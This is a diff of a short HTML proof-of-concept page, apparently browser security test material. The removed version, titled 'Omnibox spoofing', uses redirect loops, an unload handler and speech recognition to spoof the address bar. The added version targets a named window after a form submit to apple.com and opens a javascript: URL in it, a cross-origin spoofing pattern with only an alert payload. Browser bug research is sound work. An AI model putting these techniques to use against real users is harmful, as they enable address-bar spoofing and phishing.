@@ -1,26 +1,31 @@
+
 <!DOCTYPE HTML>
-<html lang="en-US">
+<html>
+
 <head>
-	<meta charset="UTF-8">
-	<input id="foo" type="button" value="Click here" onclick="setInterval(function(){document.location='https://google.com'}, 1)">
-	<title>Omnibox spoofing</title>
-	<script>
-		var x = document.getElementById('foo');
-		window.onbeforeunload = function() {
-			setInterval(function() {
-				document.location='https://google.com'
-var recognition = new webkitSpeechRecognition();
-		recognition.onstart = function(){document.location='https://google.com'}		
-  recognition.start();
-			}, 0);
-		}
-	</script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
 </head>
 
 <body>
-	<center>
-		<br>
-	</center>
+
+<form action="https://www.apple.com" target="aa" method="get" onsubmit="setTimeout('p()',1200);">
+
+<input type="submit">
+
+</form>
+
+<script>
+
+function p() {
+
+  var t = window.open('javascript:alert()','aa');
+
+}
+
+</script>
+
 </body>
 
 </html>
